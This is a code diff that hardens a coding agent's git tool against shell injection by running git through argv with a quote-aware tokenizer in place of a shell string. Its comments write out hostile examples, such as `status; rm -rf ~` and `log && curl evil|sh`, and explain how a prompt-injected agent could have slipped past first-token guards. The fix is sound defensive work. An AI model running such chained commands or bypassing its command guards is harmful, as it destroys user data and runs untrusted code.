@@ -16,7 +16,7 @@
 
 import fs from "fs";
 import path from "path";
-import { execSync, spawn } from "child_process";
+import { execSync, spawn, spawnSync } from "child_process";
 import os from "os";
 import sharedCodingAgentPolicy from "./coding-agent-policy.cjs";
 import sharedShellPolicy from "./coding-agent-shell-policy.cjs";
@@ -667,6 +667,50 @@ const IDE_DIFF_EDIT_TOOLS = new Set([
   "edit_file",
   "edit_file_hashed",
 ]);
+
+/**
+ * Quote-aware shell tokenizer (mirrors gateways/ws `tokenizeCommand`). The `git`
+ * tool runs the model-supplied command via argv (spawnSync, NO shell), so a
+ * string like `status; rm -rf ~` can't inject a second command through the
+ * shell — git just sees `status;` as an unknown subcommand. A quoted arg (e.g.
+ * a commit message) keeps its content because quotes are consumed here.
+ */
+export function tokenizeShellWords(input) {
+  const args = [];
+  let current = "";
+  let inDouble = false;
+  let inSingle = false;
+  let escape = false;
+  for (const ch of String(input || "")) {
+    if (escape) {
+      current += ch;
+      escape = false;
+      continue;
+    }
+    if (ch === "\\" && inDouble) {
+      escape = true;
+      continue;
+    }
+    if (ch === '"' && !inSingle) {
+      inDouble = !inDouble;
+      continue;
+    }
+    if (ch === "'" && !inDouble) {
+      inSingle = !inSingle;
+      continue;
+    }
+    if ((ch === " " || ch === "\t") && !inDouble && !inSingle) {
+      if (current.length > 0) {
+        args.push(current);
+        current = "";
+      }
+      continue;
+    }
+    current += ch;
+  }
+  if (current.length > 0) args.push(current);
+  return args;
+}
 
 /**
  * Compute the content an edit tool WOULD write, without writing it — the
@@ -1973,27 +2017,44 @@ async function executeToolInner(
         });
       }
 
-      try {
-        const output = execSync(`git ${normalizedCommand}`, {
-          cwd: args.cwd || cwd,
-          encoding: "utf8",
-          timeout: 60000,
-          maxBuffer: 1024 * 1024,
-        });
+      // Run via argv (spawnSync, NO shell) so shell metacharacters in the
+      // command — e.g. `status; rm -rf ~`, `log && curl evil|sh`, `$(…)` —
+      // cannot inject a second command. Previously execSync(`git ${cmd}`) ran
+      // the whole string through a shell, and the destructive-git/credential/
+      // run_shell guards only inspect the first token, so this was an arbitrary
+      // command-execution bypass for a prompt-injected agent. Quoted args (a
+      // commit message) keep their content via the quote-aware tokenizer.
+      const gitArgs = tokenizeShellWords(normalizedCommand);
+      const res = spawnSync("git", gitArgs, {
+        cwd: args.cwd || cwd,
+        encoding: "utf8",
+        timeout: 60000,
+        maxBuffer: 1024 * 1024,
+        windowsHide: true,
+      });
+      const readOnly = isReadOnlyGitCommand(normalizedCommand);
+      if (res.error) {
         return attachDescriptor({
-          stdout: output.substring(0, 30000),
+          error: String(res.error.message || res.error).substring(0, 2000),
           command: normalizedCommand,
-          readOnly: isReadOnlyGitCommand(normalizedCommand),
-        });
-      } catch (err) {
-        return attachDescriptor({
-          error: err.message.substring(0, 2000),
-          stderr: (err.stderr || "").substring(0, 2000),
-          exitCode: err.status,
-          command: normalizedCommand,
-          readOnly: isReadOnlyGitCommand(normalizedCommand),
+          readOnly,
         });
       }
+      if (res.status !== 0) {
+        const stderr = String(res.stderr || "").substring(0, 2000);
+        return attachDescriptor({
+          error: stderr || `git exited with code ${res.status}`,
+          stderr,
+          exitCode: res.status,
+          command: normalizedCommand,
+          readOnly,
+        });
+      }
+      return attachDescriptor({
+        stdout: String(res.stdout || "").substring(0, 30000),
+        command: normalizedCommand,
+        readOnly,
+      });
     }
 
     case "run_code": {
